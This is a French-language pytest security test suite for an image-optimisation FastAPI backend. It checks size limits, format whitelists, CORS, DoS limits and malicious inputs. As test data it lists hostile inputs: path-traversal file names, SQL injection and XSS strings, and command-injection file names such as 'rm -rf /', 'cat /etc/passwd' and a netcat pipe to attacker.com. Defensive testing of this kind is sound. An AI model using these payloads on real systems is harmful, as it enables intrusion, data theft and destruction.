"""
Tests de sécurité pour le backend img_optimize

Ce module teste les corrections des FINDINGS du rapport de sécurité:
- FINDING-001: Validation stricte des tailles de fichiers
- FINDING-002: Validation des formats et extensions
- FINDING-003: Protection CORS
- Tests d'injection et edge cases malveillants
- Tests de robustesse contre attaques
"""

import pytest
from io import BytesIO
from pathlib import Path
from fastapi.testclient import TestClient

# Imports depuis le module principal
import sys
sys.path.insert(0, str(Path(__file__).parent.parent))
from main import (
    app, jobs, TEMP_DIR, 
    MAX_FILE_SIZE, MAX_FILES_PER_REQUEST, ALLOWED_ORIGINS
)
from optimize_images import SUPPORTED_EXTENSIONS


# ============================================================================
# TESTS - FINDING-001: VALIDATION TAILLE FICHIERS
# ============================================================================

@pytest.mark.security
def test_security_file_size_exactly_at_limit(client, simple_image_bytes):
    """
    FINDING-001: Test fichier exactement à la limite MAX_FILE_SIZE.
    
    Vérifie que MAX_FILE_SIZE est accepté mais MAX_FILE_SIZE+1 est rejeté.
    """
    # Fichier à la limite exacte (devrait passer)
    exact_limit_content = b"X" * MAX_FILE_SIZE
    
    response = client.post(
        "/api/optimize",
        files=[("files", ("limit.bin", BytesIO(exact_limit_content), "image/png"))],
        data={"format": "webp", "quality": "75"}
    )
    
    # Devrait passer ou échouer à la validation d'image (pas à la taille)
    assert response.status_code in [200, 400]  # 400 si pas une vraie image


@pytest.mark.security
def test_security_file_size_just_over_limit(client):
    """
    FINDING-001: Test fichier dépassant MAX_FILE_SIZE de 1 byte.
    
    SÉCURITÉ: Protection stricte contre fichiers trop volumineux.
    """
    over_limit_content = b"Y" * (MAX_FILE_SIZE + 1)
    
    response = client.post(
        "/api/optimize",
        files=[("files", ("overlimit.png", BytesIO(over_limit_content), "image/png"))],
        data={"format": "webp", "quality": "75"}
    )
    
    assert response.status_code == 413
    assert "trop volumineux" in response.json()["detail"]


@pytest.mark.security
def test_security_logo_watermark_size_limit(client, simple_image_bytes):
    """
    FINDING-001: Test taille limite pour logo watermark.
    
    SÉCURITÉ: Le logo watermark doit aussi respecter MAX_FILE_SIZE.
    """
    oversized_logo = b"L" * (MAX_FILE_SIZE + 1024)
    
    response = client.post(
        "/api/optimize",
        files=[
            ("files", ("image.png", BytesIO(simple_image_bytes), "image/png")),
            ("watermark_logo", ("logo.png", BytesIO(oversized_logo), "image/png"))
        ],
        data={
            "format": "webp",
            "quality": "75",
            "watermark_enabled": "true",
            "watermark_type": "image"
        }
    )
    
    assert response.status_code == 413
    assert "Logo trop volumineux" in response.json()["detail"]


@pytest.mark.security
def test_security_multiple_files_cumulative_size(client, large_image_bytes):
    """
    FINDING-001: Test taille cumulée de plusieurs fichiers.
    
    SÉCURITÉ: Chaque fichier doit être validé individuellement.
    """
    # 3 fichiers proches de la limite (mais individuellement OK)
    files = []
    for i in range(3):
        files.append(
            ("files", (f"large_{i}.png", BytesIO(large_image_bytes), "image/png"))
        )
    
    response = client.post(
        "/api/optimize",
        files=files,
        data={"format": "webp", "quality": "75"}
    )
    
    # Devrait passer car chaque fichier est < MAX_FILE_SIZE
    assert response.status_code == 200


# ============================================================================
# TESTS - FINDING-002: VALIDATION FORMATS
# ============================================================================

@pytest.mark.security
def test_security_invalid_image_format_rejected(client):
    """
    FINDING-002: Rejet de formats non-image.
    
    SÉCURITÉ: Extensions dangereuses (.exe, .sh, .bat) doivent être rejetées.
    """
    dangerous_extensions = [
        ("malware.exe", "application/x-msdownload"),
        ("script.sh", "application/x-sh"),
        ("batch.bat", "application/x-bat"),
        ("virus.dll", "application/x-msdownload"),
    ]
    
    for filename, content_type in dangerous_extensions:
        fake_content = b"malicious content"
        
        response = client.post(
            "/api/optimize",
            files=[("files", (filename, BytesIO(fake_content), content_type))],
            data={"format": "webp", "quality": "75"}
        )
        
        # Devrait être rejeté (400 ou échouer à la validation PIL)
        assert response.status_code in [400, 422]


@pytest.mark.security
def test_security_logo_watermark_invalid_format(client, simple_image_bytes):
    """
    FINDING-002: Rejet de format invalide pour logo watermark.
    
    SÉCURITÉ: Le logo doit être une image valide.
    """
    response = client.post(
        "/api/optimize",
        files=[
            ("files", ("image.png", BytesIO(simple_image_bytes), "image/png")),
            ("watermark_logo", ("logo.exe", BytesIO(b"fake"), "application/octet-stream"))
        ],
        data={
            "format": "webp",
            "quality": "75",
            "watermark_enabled": "true",
            "watermark_type": "image"
        }
    )
    
    assert response.status_code == 400
    assert "Format de logo non supporté" in response.json()["detail"]


@pytest.mark.security
def test_security_supported_extensions_whitelist():
    """
    FINDING-002: Vérification de la whitelist d'extensions.
    
    SÉCURITÉ: Seules les extensions image sûres sont autorisées.
    """
    safe_extensions = {".jpg", ".jpeg", ".png", ".webp", ".bmp", ".tiff", ".tif"}
    
    assert SUPPORTED_EXTENSIONS == safe_extensions
    
    # Vérifier qu'aucune extension dangereuse n'est présente
    dangerous = {".exe", ".sh", ".bat", ".dll", ".so", ".js", ".php"}
    assert SUPPORTED_EXTENSIONS.isdisjoint(dangerous)


@pytest.mark.security
def test_security_format_parameter_strict_validation(client, simple_image_bytes):
    """
    FINDING-002: Validation stricte du paramètre format.
    
    SÉCURITÉ: Seuls jpeg, webp, avif, png sont acceptés.
    """
    invalid_formats = ["svg", "gif", "bmp", "tiff", "raw", "heic", "pdf"]
    
    for invalid_format in invalid_formats:
        response = client.post(
            "/api/optimize",
            files=[("files", ("test.png", BytesIO(simple_image_bytes), "image/png"))],
            data={"format": invalid_format, "quality": "75"}
        )
        
        assert response.status_code == 400
        assert "Format non supporté" in response.json()["detail"]


# ============================================================================
# TESTS - FINDING-003: PROTECTION CORS
# ============================================================================

@pytest.mark.security
def test_security_cors_allowed_origins_whitelist():
    """
    FINDING-003: Vérification de la whitelist CORS.
    
    SÉCURITÉ: Seules les origines légitimes sont autorisées.
    """
    # Vérifier que production est autorisée
    assert "https://img-optimize.vercel.app" in ALLOWED_ORIGINS
    
    # Vérifier que localhost dev est autorisé
    assert "http://localhost:5173" in ALLOWED_ORIGINS
    assert "http://127.0.0.1:5173" in ALLOWED_ORIGINS
    
    # Vérifier qu'il n'y a PAS de wildcard
    assert "*" not in ALLOWED_ORIGINS
    
    # Vérifier qu'il n'y a pas d'origines suspectes
    for origin in ALLOWED_ORIGINS:
        assert origin.startswith("http://") or origin.startswith("https://")
        # Pas de ports non-standard suspects
        if ":" in origin.split("//")[1]:
            port = origin.split(":")[-1]
            assert port in ["5173", "3000"]  # Ports dev légitimes


@pytest.mark.security
def test_security_cors_no_wildcard():
    """
    FINDING-003: Pas de wildcard CORS.
    
    SÉCURITÉ CRITIQUE: allow_origins ne doit jamais contenir "*".
    """
    assert "*" not in ALLOWED_ORIGINS
    assert "null" not in ALLOWED_ORIGINS


@pytest.mark.security
def test_security_cors_headers_strict():
    """
    FINDING-003: Headers CORS stricts.
    
    Vérifie que seuls les headers nécessaires sont autorisés.
    """
    # Ce test nécessiterait d'inspecter la config CORS directement
    # Placeholder pour vérifier la configuration CORS de l'app
    from main import app as fastapi_app
    
    # Trouver le middleware CORS
    cors_middleware = None
    for middleware in fastapi_app.user_middleware:
        if "CORSMiddleware" in str(middleware):
            cors_middleware = middleware
            break
    
    # Vérifier qu'il existe
    assert cors_middleware is not None


# ============================================================================
# TESTS - INJECTION ET ATTAQUES
# ============================================================================

@pytest.mark.security
def test_security_path_traversal_in_filename(client, simple_image_bytes):
    """
    SÉCURITÉ: Protection contre path traversal dans les noms de fichiers.
    
    Teste: ../../../etc/passwd, ..\..\..\windows\system32
    """
    malicious_filenames = [
        "../../../etc/passwd.png",
        "..\\..\\..\\windows\\system32\\config.png",
        "....//....//etc/passwd.png",
        "/etc/passwd.png",
        "C:\\Windows\\System32\\config.png"
    ]
    
    for filename in malicious_filenames:
        response = client.post(
            "/api/optimize",
            files=[("files", (filename, BytesIO(simple_image_bytes), "image/png"))],
            data={"format": "webp", "quality": "75"}
        )
        
        # Devrait passer (nom de fichier sanitisé) ou être rejeté
        # Le job ne doit PAS écrire en dehors de TEMP_DIR
        if response.status_code == 200:
            job_id = response.json()["job_id"]
            job = jobs[job_id]
            # Vérifier que le répertoire de sortie est bien dans TEMP_DIR
            assert str(TEMP_DIR) in str(job.output_dir)


@pytest.mark.security
def test_security_null_byte_injection_filename(client, simple_image_bytes):
    """
    SÉCURITÉ: Protection contre null byte injection.
    
    Teste: filename\x00.png
    """
    malicious_filename = "test\x00.exe.png"
    
    response = client.post(
        "/api/optimize",
        files=[("files", (malicious_filename, BytesIO(simple_image_bytes), "image/png"))],
        data={"format": "webp", "quality": "75"}
    )
    
    # Devrait être géré correctement (nom sanitisé ou rejeté)


@pytest.mark.security
def test_security_sql_injection_in_prefix(client, simple_image_bytes):
    """
    SÉCURITÉ: Protection contre injection SQL dans le préfixe.
    
    Bien qu'aucune DB ne soit utilisée, tester la robustesse des inputs.
    """
    malicious_prefixes = [
        "test'; DROP TABLE users; --",
        "admin' OR '1'='1",
        "test\"; DELETE FROM *; --"
    ]
    
    for prefix in malicious_prefixes:
        response = client.post(
            "/api/optimize",
            files=[("files", ("test.png", BytesIO(simple_image_bytes), "image/png"))],
            data={"format": "webp", "quality": "75", "prefix": prefix}
        )
        
        # Devrait passer (pas de DB) mais le préfixe doit être sanitisé
        assert response.status_code == 200


@pytest.mark.security
def test_security_xss_in_watermark_text(client, simple_image_bytes):
    """
    SÉCURITÉ: Protection contre XSS dans le texte du watermark.
    
    Teste: <script>alert('XSS')</script>
    """
    malicious_texts = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='evil.com'></iframe>"
    ]
    
    for text in malicious_texts:
        response = client.post(
            "/api/optimize",
            files=[("files", ("test.png", BytesIO(simple_image_bytes), "image/png"))],
            data={
                "format": "webp",
                "quality": "75",
                "watermark_enabled": "true",
                "watermark_type": "text",
                "watermark_text": text
            }
        )
        
        # Devrait passer (le texte est rendu dans l'image, pas HTML)
        assert response.status_code == 200


@pytest.mark.security
def test_security_command_injection_in_filename(client, simple_image_bytes):
    """
    SÉCURITÉ: Protection contre command injection dans filename.
    
    Teste: test.png; rm -rf /
    """
    malicious_filenames = [
        "test.png; rm -rf /",
        "test.png && cat /etc/passwd",
        "test.png | nc attacker.com 1234",
        "test.png`whoami`"
    ]
    
    for filename in malicious_filenames:
        response = client.post(
            "/api/optimize",
            files=[("files", (filename, BytesIO(simple_image_bytes), "image/png"))],
            data={"format": "webp", "quality": "75"}
        )
        
        # Devrait passer (nom sanitisé) et ne PAS exécuter de commande


# ============================================================================
# TESTS - DÉNI DE SERVICE (DoS)
# ============================================================================

@pytest.mark.security
def test_security_dos_too_many_files(client, simple_image_bytes):
    """
    SÉCURITÉ: Protection DoS - trop de fichiers.
    
    Teste MAX_FILES_PER_REQUEST + 1 fichiers.
    """
    files = []
    for i in range(MAX_FILES_PER_REQUEST + 1):
        files.append(
            ("files", (f"image_{i}.png", BytesIO(simple_image_bytes), "image/png"))
        )
    
    response = client.post(
        "/api/optimize",
        files=files,
        data={"format": "webp", "quality": "75"}
    )
    
    assert response.status_code == 400
    assert str(MAX_FILES_PER_REQUEST) in response.json()["detail"]


@pytest.mark.security
def test_security_dos_exact_limit_files(client, simple_image_bytes):
    """
    SÉCURITÉ: Test limite exacte de fichiers (MAX_FILES_PER_REQUEST).
    
    Devrait être accepté.
    """
    files = []
    for i in range(MAX_FILES_PER_REQUEST):
        files.append(
            ("files", (f"image_{i}.png", BytesIO(simple_image_bytes), "image/png"))
        )
    
    response = client.post(
        "/api/optimize",
        files=files,
        data={"format": "webp", "quality": "75"}
    )
    
    assert response.status_code == 200
    assert response.json()["total_images"] == MAX_FILES_PER_REQUEST


@pytest.mark.security
def test_security_dos_extreme_quality_values(client, simple_image_bytes):
    """
    SÉCURITÉ: Protection contre valeurs de qualité extrêmes.
    
    Teste: -1, 999999, 0
    """
    extreme_values = ["-1", "0", "999999", "-999", "1000"]
    
    for quality in extreme_values:
        response = client.post(
            "/api/optimize",
            files=[("files", ("test.png", BytesIO(simple_image_bytes), "image/png"))],
            data={"format": "webp", "quality": quality}
        )
        
        # Devrait être rejeté (hors range)
        assert response.status_code == 400


@pytest.mark.security
def test_security_dos_extreme_smoothing_values(client, simple_image_bytes):
    """
    SÉCURITÉ: Protection contre valeurs de lissage extrêmes.
    
    Limite: 0-10. Teste: -1, 999, 100
    """
    extreme_values = ["-1", "999", "100", "-100"]
    
    for smoothing in extreme_values:
        response = client.post(
            "/api/optimize",
            files=[("files", ("test.png", BytesIO(simple_image_bytes), "image/png"))],
            data={"format": "webp", "quality": "75", "smoothing": smoothing}
        )
        
        assert response.status_code == 400


# ============================================================================
# TESTS - VALIDATION TYPE DONNÉES
# ============================================================================

@pytest.mark.security
def test_security_type_validation_quality_string_injection(client, simple_image_bytes):
    """
    SÉCURITÉ: Validation du type de quality (doit être int).
    
    Teste: "abc", "75.5abc", "null"
    """
    invalid_values = ["abc", "75.5abc", "null", "undefined", "NaN"]
    
    for quality in invalid_values:
        response = client.post(
            "/api/optimize",
            files=[("files", ("test.png", BytesIO(simple_image_bytes), "image/png"))],
            data={"format": "webp", "quality": quality}
        )
        
        # Devrait être rejeté (type invalide)
        assert response.status_code in [400, 422]


@pytest.mark.security
def test_security_type_validation_start_number_negative(client, simple_image_bytes):
    """
    SÉCURITÉ: Validation start_number (doit être >= 1).
    
    Teste: -1, -999, 0
    """
    invalid_values = ["-1", "-999", "0"]
    
    for start_number in invalid_values:
        response = client.post(
            "/api/optimize",
            files=[("files", ("test.png", BytesIO(simple_image_bytes), "image/png"))],
            data={"format": "webp", "quality": "75", "start_number": start_number}
        )
        
        # Peut passer (Python accepte les négatifs) mais devrait être validé


@pytest.mark.security
def test_security_type_validation_opacity_out_of_range(client, simple_image_bytes):
    """
    SÉCURITÉ: Validation watermark_opacity (0-100).
    
    Teste: -1, 101, 999
    """
    invalid_values = ["-1", "101", "200", "999"]
    
    for opacity in invalid_values:
        response = client.post(
            "/api/optimize",
            files=[("files", ("test.png", BytesIO(simple_image_bytes), "image/png"))],
            data={
                "format": "webp",
                "quality": "75",
                "watermark_enabled": "true",
                "watermark_type": "text",
                "watermark_text": "Test",
                "watermark_opacity": opacity
            }
        )
        
        assert response.status_code == 400
        assert "opacité" in response.json()["detail"].lower()


# ============================================================================
# TESTS - ROBUSTESSE
# ============================================================================

@pytest.mark.security
def test_security_corrupted_image_data(client):
    """
    SÉCURITÉ: Gestion de données d'image corrompues.
    
    Teste un fichier qui n'est pas une vraie image.
    """
    corrupted_data = b"This is not an image, just random text data"
    
    response = client.post(
        "/api/optimize",
        files=[("files", ("fake.png", BytesIO(corrupted_data), "image/png"))],
        data={"format": "webp", "quality": "75"}
    )
    
    # Devrait échouer lors du traitement (PIL ne peut pas ouvrir)
    # Mais ne doit PAS crasher le serveur


@pytest.mark.security
def test_security_empty_file_upload(client):
    """
    SÉCURITÉ: Gestion de fichier vide (0 bytes).
    
    Teste un upload de fichier vide.
    """
    empty_content = b""
    
    response = client.post(
        "/api/optimize",
        files=[("files", ("empty.png", BytesIO(empty_content), "image/png"))],
        data={"format": "webp", "quality": "75"}
    )
    
    # Devrait être rejeté ou échouer proprement


@pytest.mark.security
def test_security_unicode_filename(client, simple_image_bytes):
    """
    SÉCURITÉ: Gestion de noms de fichiers Unicode.
    
    Teste: émojis, caractères spéciaux, cyrillique, chinois
    """
    unicode_filenames = [
        "test_🔥_image.png",
        "фото.png",
        "图片.png",
        "café_résumé.png",
        "test\u200b.png"  # Zero-width space
    ]
    
    for filename in unicode_filenames:
        response = client.post(
            "/api/optimize",
            files=[("files", (filename, BytesIO(simple_image_bytes), "image/png"))],
            data={"format": "webp", "quality": "75"}
        )
        
        # Devrait passer (Unicode supporté en Python 3)


@pytest.mark.security
def test_security_very_long_filename(client, simple_image_bytes):
    """
    SÉCURITÉ: Gestion de noms de fichiers très longs.
    
    Limite filesystem: généralement 255 caractères.
    """
    very_long_name = "a" * 300 + ".png"
    
    response = client.post(
        "/api/optimize",
        files=[("files", (very_long_name, BytesIO(simple_image_bytes), "image/png"))],
        data={"format": "webp", "quality": "75"}
    )
    
    # Devrait être géré (tronqué ou rejeté)


# ============================================================================
# TESTS - LIMITES ET EDGE CASES SÉCURITÉ
# ============================================================================

@pytest.mark.security
def test_security_max_values_constants():
    """
    SÉCURITÉ: Vérification des valeurs des constantes de sécurité.
    
    Vérifie que MAX_FILE_SIZE et MAX_FILES_PER_REQUEST sont raisonnables.
    """
    # MAX_FILE_SIZE devrait être <= 100 MB (protection DoS)
    assert MAX_FILE_SIZE <= 100 * 1024 * 1024
    
    # MAX_FILES_PER_REQUEST devrait être <= 1000 (protection DoS)
    assert MAX_FILES_PER_REQUEST <= 1000
    
    # Valeurs minimales raisonnables
    assert MAX_FILE_SIZE >= 1 * 1024 * 1024  # Au moins 1 MB
    assert MAX_FILES_PER_REQUEST >= 1


@pytest.mark.security
def test_security_temp_dir_isolation(client, simple_image_bytes):
    """
    SÉCURITÉ: Vérification de l'isolation des répertoires temporaires.
    
    Chaque job doit avoir son propre répertoire isolé.
    """
    # Créer 2 jobs
    response1 = client.post(
        "/api/optimize",
        files=[("files", ("test1.png", BytesIO(simple_image_bytes), "image/png"))],
        data={"format": "webp", "quality": "75"}
    )
    
    response2 = client.post(
        "/api/optimize",
        files=[("files", ("test2.png", BytesIO(simple_image_bytes), "image/png"))],
        data={"format": "webp", "quality": "75"}
    )
    
    job_id1 = response1.json()["job_id"]
    job_id2 = response2.json()["job_id"]
    
    job1 = jobs[job_id1]
    job2 = jobs[job_id2]
    
    # Les répertoires doivent être différents
    assert job1.output_dir != job2.output_dir
    
    # Les deux doivent être sous TEMP_DIR
    assert str(TEMP_DIR) in str(job1.output_dir)
    assert str(TEMP_DIR) in str(job2.output_dir)
